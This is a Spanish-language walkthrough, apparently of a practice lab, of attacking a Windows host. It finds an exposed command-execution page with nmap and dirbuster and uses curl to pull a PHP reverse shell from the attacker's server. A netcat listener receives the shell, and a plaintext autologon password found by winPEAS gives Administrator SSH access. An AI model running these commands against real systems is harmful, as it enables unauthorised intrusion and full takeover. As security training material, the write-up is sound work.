---
title: Pentesting Escalate_Win
published: true
---

### Reconocimiento
Escaneamos con **nmap**:
```
sudo nmap -p- -T4 [IP DE LA VÍCTIMA] -oN nmap.txt
```
![](/images/20220513115055.png)

Vemos que la máquina tiene el puerto 80 abierto(**http**), por lo tanto, es accesible desde un navegador web:

![](/images/20220513115328.png)

Lanzamos un ataque de diccionario con **dirbuster** para descubrir que directorios hay disponibles:

![](/images/20220513120012.png)

Detectamos un archivo que parece interesante "**shell.php**":

![](/images/20220513120328.png)

![](/images/20220513121121.png)

Como vemos se pueden ejecutar comandos a través de parámetros en la url:

![](/images/20220513121252.png)

### Exploit
Para conseguir una consola interactiva con la máquina víctima utilizamos una **shell inversa** y **netcat**:

En este caso he escogido esta, ya que es compatible con Windows: [php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

Descargamos la shell a nuestra máquina con el comando **wget**:
```
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
```

Ahora editamos el código de **php_reverse_shell.php** para que conecte a nuestra máquina:
```
nano php_reverse_shell.php
```
![](/images/20220513122810.png)

*En mi caso la ip de kali es 192.168.3.249 y utilizaré el puerto 4444*
Una vez editado guardamos con **CTRL+S** y cerramos con **CTRL+X**

Lo siguiente es iniciar un **servidor http** para poder descargar la shell en la máquina víctima:
```
sudo python3 -m http.server 80
```
![](/images/20220513123751.png)

Descargamos la shell a la máquina víctima desde el navegador utilizando **curl**:
```
http://[IP DE LA VÍCTIMA]/shell.php?cmd=curl+http://[IP DEL ATACANTE]/php_reverse_shell.php+-O+php_reverse_shell.php
```
*Si todo ha ido bien, el servidor nos contestara con una página en blanco*

Podemos ver que nuestro shell se ha subido correctamente:
```
http://[IP DE LA VÍCTIMA]/shell.php?ls+-la
```
![](/images/20220513125043.png)

Ya podemos cerrar el servidor http en kali.

Ponemos **netcat** a la escucha en el puerto 4444:
```
nc -nlvp 4444
```
![](/images/20220513125601.png)

Lo único que falta es ejecutar la shell en la máquina víctima:
```
http://[IP DE LA VÍCTIMA]/php_reverse_shell.php.php
```
*Si todo va bien, el navegador se quedara cargando.*

Listo, hemos recibido una conexion en netcat que nos da acceso remoto a la máquina víctima:

![](/images/20220513130346.png)

![](/images/20220513130922.png)

A partir de aquí pasaríamos a la fase de **escalada de privilegios**.

### Escalada

Para encontrar nuestro vector de ataque utilizamos [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS), que es uno de los mejores scripts para escalada de privilegios.

Descargamos el script a nuestra máquina con el comando **wget**:
```
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
```
Volvemos a iniciar el **servidor http** para descargar el script desde la máquina víctima:
```
sudo python3 -m http.server 80
```
Desde la consola que tenemos en la máquina víctima, descargamos el script con **curl**:
```
curl http://[IP DEL ATACANTE]/winPEAS.bat -o winPEAS.bat
```
![](/images/20220515132412.png)

Ejecutamos el script en la máquina víctima:
```
winPEAS.bat
```
WinPEAS nos da muchísima información, pero nos fijamos en la parte que nos indica las vulnerabilidades que no están parcheadas:

![](/images/20220515132738.png)

También aparece una contraseña guardada del inicio de sesión automático:

![](/images/20220515133604.png)

Probamos a conectarnos por **SSH** con la cuenta de administrador:
```
ssh Administrator@[IP DE LA VÍCTIMA]
```
**Bingo!** Tras introducir la contraseña que hemos encontrado en ¨winLogon¨ tenemos el control total de la máquina víctima:

![](/images/20220515134932.png)

Esto demuestra los riesgos que hay al guardar contraseñas para el inicio de sesión automático, y la mala gestión de Windows por almacenar esta contraseña en texto plano.

### Enlaces interesantes

* Dirbuster - [https://www.kali.org/tools/dirbuster/](https://www.kali.org/tools/dirbuster/)
* Php-reverse-shell - [https://github.com/ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell)
* Hacking with Netcat - [https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)
* Privilege Escalation Awesome Scripts SUITE - [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)